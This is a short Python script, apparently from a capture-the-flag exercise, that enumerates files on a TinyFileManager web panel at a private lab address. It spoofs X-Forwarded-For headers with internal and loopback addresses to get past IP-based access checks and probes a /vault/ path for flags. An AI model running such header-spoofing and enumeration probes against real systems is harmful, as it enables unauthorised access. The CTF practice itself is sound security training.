import socket
import urllib.request
import re

IP = "192.168.60.113"

print(f"[*] Auditing {IP} for CTF flags...")

# 1. Check TinyFileManager on Port 80
def get_http(path, headers=None):
    if headers is None:
        headers = {}
    url = f"http://{IP}{path}"
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = resp.read().decode('utf-8', errors='ignore')
            return resp.status, dict(resp.headers), data
    except urllib.error.HTTPError as e:
        data = e.read().decode('utf-8', errors='ignore')
        return e.code, dict(e.headers), data
    except Exception as e:
        return 0, {}, str(e)

# First get cookie
status, hdrs, body = get_http("/")
cookie = hdrs.get("Set-Cookie", "").split(";")[0]
print(f"Cookie: {cookie}")

# Get file manager index
headers = {"Cookie": cookie}
status, hdrs, body = get_http("/index.php?p=", headers)
print(f"TinyFM Index Status: {status}, Length: {len(body)}")

# Search for any flag patterns in body
flags_found = set(re.findall(r'(?:flag|FLAG|MITIGATA)\{[^}]+\}', body))
print(f"Flags directly in TinyFM page: {flags_found}")

# Extract all links/files from TinyFM
file_links = re.findall(r'href="([^"]*index\.php\?[^"]*)"', body)
print(f"Found {len(file_links)} links in TinyFM:")
for link in file_links[:20]:
    print("  ", link)

# Also check for table rows with file names
names = re.findall(r'<span class="name"[^>]*>(.*?)</span>', body, re.DOTALL)
print("Files in current directory:", [n.strip() for n in names])

# 2. Test X-Forwarded-For variations
for xff in ["192.168.60.1", "127.0.0.1", "0.0.0.0", "localhost"]:
    s, h, b = get_http("/", {"X-Forwarded-For": xff, "Cookie": cookie})
    fl = set(re.findall(r'(?:flag|FLAG|MITIGATA)\{[^}]+\}', b))
    if fl:
        print(f"Flags with XFF {xff}: {fl}")
    title = re.findall(r'<title>(.*?)</title>', b, re.I)
    print(f"XFF {xff} -> Title: {title}")

# 3. Check /vault/
s, h, b = get_http("/vault/", {"Cookie": cookie, "X-Forwarded-For": "192.168.60.1"})
print(f"/vault/ Status: {s}")
fl = set(re.findall(r'(?:flag|FLAG|MITIGATA)\{[^}]+\}', b))
print(f"/vault/ flags: {fl}")
v_links = re.findall(r'href="([^"]+)"', b)
print(f"/vault/ entries: {v_links}")

